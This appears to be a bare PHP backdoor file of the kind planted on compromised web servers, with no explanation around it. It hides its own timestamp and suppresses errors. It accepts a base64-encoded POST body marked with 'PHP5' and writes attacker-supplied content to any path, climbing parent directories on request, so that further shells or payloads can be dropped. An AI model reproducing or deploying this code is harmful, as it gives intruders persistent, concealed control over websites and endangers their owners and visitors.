<?php

// 2
// 2
// 2
// 2
// 2
// 2
// 2
// 2
// 2
// 2
// 2
// 2
// 2
// 2
// 2
// 2
// 2
// 2
// 2
// 2
// 2
// 2
// 2
// 2
// 2
// 2
// 2
// 2
// 2
// 2
// 2
// 2

error_reporting(0);
@touch(__FILE__, mktime(1,1,1,1,2,2020), mktime(1,1,1,1,3,2020));

function d($msg)
{
	die(substr(md5(microtime()), rand(0,26), 5).$msg);
}

$data = file_get_contents('php://input');

if (strlen($data) <= 4) d('e0');

$data = substr($data, 3);
$data = base64_decode($data);
$c = 'PHP5';
if (substr($data, -strlen($c)) !== $c) d('e1');
$data = substr($data, 0, -strlen($c));

$p = strpos($data, ';'); if ($p === false) d('e2');
$data = substr($data, $p+1);

$p = strpos($data, ';'); if ($p === false) d('e3');
$fname = substr($data, 0, $p); $data = substr($data, $p+1);
if (!strlen($fname)) d('e5');
$fname = str_replace('/', DIRECTORY_SEPARATOR, $fname);
$fname = str_replace('\\', DIRECTORY_SEPARATOR, $fname);

$p = strpos($data, ';'); if ($p === false) d('e4');
$up = substr($data, 0, $p); $data = substr($data, $p+1);

$up = intval($up);

$dir = __DIR__;
for ($i = 0; $i < $up; $i++) $dir = dirname($dir);

$p = strrpos($fname, DIRECTORY_SEPARATOR);
if ($p > 0) {
    @mkdir(rtrim($dir, DIRECTORY_SEPARATOR).DIRECTORY_SEPARATOR.rtrim(substr($fname, 0, $p), DIRECTORY_SEPARATOR), 0777, true);
}

if ($up > 0) {
    $fname = rtrim($dir, DIRECTORY_SEPARATOR).DIRECTORY_SEPARATOR.$fname;
}

for ($i = 0; $i < 20; $i++) {
	file_put_contents($fname, $data, LOCK_EX);
    @touch($filename, mktime(1,1,1,1,2,2020), mktime(1,1,1,1,3,2020));
	$ok = file_exists($fname);
	if ($ok) break;
}

if ($ok) {
	d('ok');
} else {
	d('bad:'.$fname.'|'.__DIR__);
}

